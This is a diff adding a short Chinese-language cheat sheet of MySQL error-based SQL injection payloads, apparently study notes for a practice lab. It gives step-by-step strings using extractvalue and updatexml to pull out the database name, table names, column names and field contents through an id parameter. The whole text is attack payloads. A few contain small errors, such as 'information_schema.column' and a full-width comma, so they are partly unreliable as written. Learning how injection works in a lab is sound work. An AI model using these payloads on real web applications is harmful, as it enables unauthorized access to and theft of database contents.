@@ -1,0 +1,20 @@
+报错注入之一     extractvalue
+1. 爆库
+    ?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
+2.爆表
+    ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) 
+from information_schema.tables where table_schema=database()),0x7e)) --+
+3.爆字段名
+    ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) 
+from information_schema.column where table_name='表名' and table_schema='库名'),0x7e)) --+
+4.爆内容
+    ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(字段名) from 表名),0x7e)) --+
+报错注入之二     updatexml
+1.爆库
+    ?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
+2.报表
+    ?id=1' and updatexml(1, concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+
+3.爆字段名
+    ?id=1' and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='库名')，0x7e),1) --+
+4.爆内容
+    ?id=1' and updatexml(1,concat(0x7e,(select group_concat(字段名) from 表名),0x7e),1) --+
